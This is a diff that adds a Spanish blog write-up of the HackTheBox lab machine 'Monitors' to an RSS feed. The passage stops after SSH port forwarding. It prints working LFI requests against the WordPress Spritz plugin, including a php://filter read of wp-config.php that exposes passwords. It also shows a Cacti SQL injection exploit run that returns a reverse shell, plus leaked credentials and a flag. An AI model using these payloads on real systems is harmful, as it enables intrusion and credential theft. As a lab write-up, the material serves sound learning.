@@ -5,9 +5,817 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 04 May 2023 02:39:37 +0000</pubDate>
-    <lastBuildDate>Thu, 04 May 2023 02:39:37 +0000</lastBuildDate>
+    <pubDate>Mon, 15 May 2023 00:09:25 +0000</pubDate>
+    <lastBuildDate>Mon, 15 May 2023 00:09:25 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Monitors - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Monitors&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Linux&lt;/code&gt; de dificultad &lt;code&gt;Dificil&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin &lt;code&gt;spritz&lt;/code&gt; de &lt;code&gt;Wordpress&lt;/code&gt; que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de &lt;code&gt;cacti&lt;/code&gt; con una version vulnerable, seguidamente abusaremos de un ataque de &lt;code&gt;deserealizacion&lt;/code&gt; con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability &lt;code&gt;sysmodule&lt;/code&gt; para escapar del contenedor y ganar acceso a la maquina real como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Monitors
+❯ ls
+ Monitors
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.238
+PING 10.10.10.238 (10.10.10.238) 56(84) bytes of data.
+64 bytes from 10.10.10.238: icmp_seq=1 ttl=63 time=108 ms
+
+--- 10.10.10.238 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 108.365/108.365/108.365/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;63&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.238 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:04 GMT
+Initiating SYN Stealth Scan at 21:04
+Scanning 10.10.10.238 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.238
+Discovered open port 80/tcp on 10.10.10.238
+Completed SYN Stealth Scan at 21:04, 28.62s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.238
+Host is up, received user-set (2.6s latency).
+Scanned at 2023-05-14 21:04:30 GMT for 29s
+Not shown: 60433 closed tcp ports (reset), 5100 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
+           Raw packets sent: 110162 (4.847MB) | Rcvd: 86054 (3.442MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos ver puertos interesantes que se encuentran abiertos como &lt;code&gt;22 ssh&lt;/code&gt; y &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.238 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:05 GMT
+Nmap scan report for monitors.htb (10.10.10.238)
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
+|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
+|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriously
+|_http-generator: WordPress 5.5.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Primero ya que &lt;code&gt;nmap&lt;/code&gt; no detecto el servicio del puerto &lt;code&gt;80&lt;/code&gt; se encuentra abierto, trataremos de identificar las tecnologias que usa con la ayuda de &lt;code&gt;whatweb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.238
+http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos ver que se esta aplicando virtual hosting, asi que procederemos a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Volvemos a usar &lt;code&gt;whatweb&lt;/code&gt;, pero esta vez aputando al dominio y esta vez la herramienta nos reporta el gestor de contenido que corresponde a un &lt;code&gt;wordpress&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://monitors.htb
+http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procedemos a abrir la pagina en nuestro navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos un articulo publicado por el usuario &lt;code&gt;admin&lt;/code&gt;, y para validar que este es un usuario valido podemos intentar logearnos como este en la ruta &lt;code&gt;wp-login.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora al tratarse de un &lt;code&gt;wordpress&lt;/code&gt; trataremos de buscar plugins vulnerables asociados, para ello usaremos el diccionario &lt;code&gt;wp-plugins.fuzz.txt&lt;/code&gt; del repositorio de &lt;code&gt;seclists&lt;/code&gt;, enconjunto con nuestra herramienta de confianza &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://monitors.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://monitors.htb/FUZZ
+Total requests: 13368
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+
+Total time: 36.76465
+Processed Requests: 13368
+Filtered Requests: 13368
+Requests/sec.: 363.6101
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;wfuzz&lt;/code&gt; no logro descubrir un plugin valido, pero podemos tratar de acceder a la ruta de los &lt;code&gt;plugins&lt;/code&gt; y ver si tenemos permiso para lista el directorio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos lista el contenido vemos el servicio usa &lt;code&gt;spritz&lt;/code&gt; como plugin, asi que trataremos de buscar si existe una vulnerabilidad asociada a ello con &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit spritz
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                                                                                          | php/webapps/44544.php
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Efectivamente tal y como nos reporta existe una vulnerabilidad asociada &lt;code&gt;Remote File Inclusion&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Analizando el codigo del &lt;code&gt;exploit&lt;/code&gt; vemos que aprovecha una ruta para poder lista archivos de la maquina.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat 44544.php
+
+1. Version Disclosure
+
+/wp-content/plugins/wp-with-spritz/readme.txt
+
+2. Source Code
+
+if(isset($_GET['url'])){
+$content=file_get_contents($_GET['url']);
+
+3. Proof of Concept
+
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Probamos a listar el &lt;code&gt;/etc/hosts&lt;/code&gt; de la maquina victima y nos lo muestra con exito.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd&quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
+mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como sabemos que el servicio usa &lt;code&gt;apache&lt;/code&gt;, podemos trata de listar el &lt;code&gt;000-default.conf&lt;/code&gt; y tratar de filtrar información.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf&quot;
+# Default virtual host settings
+# Add monitors.htb.conf
+# Add cacti-admin.monitors.htb.conf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que existe otro &lt;code&gt;subdominio&lt;/code&gt;, asi que procederemos a agregarlo tambien a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.238 cacti-admin.monitors.htb&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora visiualizamos el servicio en el navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que usa &lt;code&gt;cacti&lt;/code&gt; y con una version concreta correspondiente a la &lt;code&gt;1.2.12&lt;/code&gt; y que tiene una vulnerabilidad asociada.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit cacti 1.2.12
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Cacti 1.2.12 - 'filter' SQL Injection                                                                                                                | php/webapps/49810.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Examinando el &lt;code&gt;exploit&lt;/code&gt; vemos que deriva en una ejecución de comandos, y al ejecutarlo nos pide un &lt;code&gt;usuario y contraseña'&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 cacti.py
+usage: cacti.py [-h] -t &amp;lt;target/host URL&amp;gt; -u &amp;lt;user&amp;gt; -p &amp;lt;password&amp;gt; --lhost &amp;lt;lhost&amp;gt; --lport &amp;lt;lport&amp;gt;
+cacti.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Debemos recordar que al enfrentarnos a un &lt;code&gt;wordpress&lt;/code&gt;, podemos listar el &lt;code&gt;wp-config.php&lt;/code&gt; y obtener unas credenciales validas, para ello podemos usar el &lt;code&gt;exploit spritz&lt;/code&gt; y un wraper encoding de &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php&quot; | base64 -d
+&amp;lt;?php
+*
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wpadmin' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtemos unas credenciales que justamente son validas para el servicio &lt;code&gt;cacti&lt;/code&gt;, asi que usaremos el &lt;code&gt;exploit&lt;/code&gt; con los parametros necesarios y nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 cacti.py -t http://cacti-admin.monitors.htb -u 'admin' -p 'BestAdministrator@2020!' --lhost 10.10.16.3 --lport 443
+[+] Connecting to the server...
+[+] Retrieving CSRF token...
+[+] Got CSRF token: sid:127e441cbfce235feca8a95a0ffa545f8f9f4f02,1684101076
+[+] Trying to log in...
+[+] Successfully logged in!
+
+[+] SQL Injection:
+&quot;name&quot;,&quot;hex&quot;
+&quot;admin&quot;,&quot;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&quot;
+&quot;guest&quot;,&quot;43e9a4ab75570f5b&quot;
+
+[+] Check your nc listener!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recibimos la conexion como &lt;code&gt;www-data&lt;/code&gt; y estamos en la maquina victima.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.238.
+Ncat: Connection from 10.10.10.238:38574.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname -I
+10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como es de costumbre vamos a conseguir una &lt;code&gt;tty&lt;/code&gt; full interactiva.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@monitors:/usr/share/cacti/cacti$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
+www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
+www-data@monitors:/usr/share/cacti/cacti$ stty rows 45 columns 184
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;marcus&lt;/code&gt; y vemos que aun no podemos visualizar la &lt;code&gt;flag&lt;/code&gt; como &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home$ cd marcus/
+www-data@monitors:/home/marcus$ ls
+note.txt  user.txt
+www-data@monitors:/home/marcus$ cat user.txt 
+cat: user.txt: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como tenemos un servicio &lt;code&gt;cacti&lt;/code&gt; vamos a tratar de filtrar desde la raiz archivos que contengan la palabra &lt;code&gt;cacti&lt;/code&gt; y encontramos una ruta con un archivo &lt;code&gt;cacti-backup-service&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ find / -name \*cacti\* 2&amp;gt;/dev/null
+/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
+/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
+/etc/systemd/system/cacti-backup.service
+/lib/systemd/system/cacti-backup.service
+/var/log/cacti-access.log
+/var/log/cacti-error.log
+/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitor.htb
+/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitors.htb
+/usr/share/cacti
+/usr/share/cacti/cacti
+/usr/share/cacti/cacti/log/cacti.log
+/usr/share/cacti/cacti/locales/po/cacti.pot
+/usr/share/cacti/cacti/scripts/cacti_user_stats.php
+/usr/share/cacti/cacti/include/cacti_version
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Leemos el archivo y dentro nos muestra que dentro del directorio oculto &lt;code&gt;.backup&lt;/code&gt; se encuentra un archivo &lt;code&gt;backup.sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service 
+[Unit]
+Description=Cacti Backup Service
+After=network.target
+
+[Service]
+Type=oneshot
+User=www-data
+ExecStart=/home/marcus/.backup/backup.sh
+
+[Install]
+WantedBy=multi-user.target
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Leemos el archivo &lt;code&gt;backup.sh&lt;/code&gt; y encontramos unas credenciales.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
+#!/bin/bash
+
+backup_name=&quot;cacti_backup&quot;
+config_pass=&quot;VerticalEdge2020&quot;
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p &quot;${config_pass}&quot; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Probamos la contraseña y podemos convertirnos en el usuario &lt;code&gt;marcus&lt;/code&gt; y ahora si podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ su marcus
+Password: 
+marcus@monitors:~$ whoami
+marcus
+marcus@monitors:~$ cat /home/marcus/user.txt 
+055c999cf2967582c6bd59b2cd7fd44f
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Enumerando el sistema al lista los puertos abiertos en la maquina, vemos un puerto curioso &lt;code&gt;8443&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@monitors:~$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      1 10.10.10.238:59308      1.1.1.1:53              SYN_SENT   
+tcp        0    138 10.10.10.238:38574      10.10.16.3:443          ESTABLISHED
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       1      0 10.10.10.238:80         10.10.16.3:38872        CLOSE_WAIT
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para poder tener acceso a el desde nuestra maquina, nos conectaremos como el usuario &lt;code&gt;marcus&lt;/code&gt; por el servicio &lt;code&gt;ssh&lt;/code&gt;, que si recordamos estaba abierto y aplicaremos un &lt;code&gt;local port forwarding&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
+marcus@10.10.10.238's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun May 14 22:16:22 UTC 2023
+
+  System load:  0.08               Users logged in:                0
+  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
+  Memory usage: 46%                IP address for docker0:         172.17.0.1
+  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
+  Processes:    189
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+128 packages can be updated.
+97 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
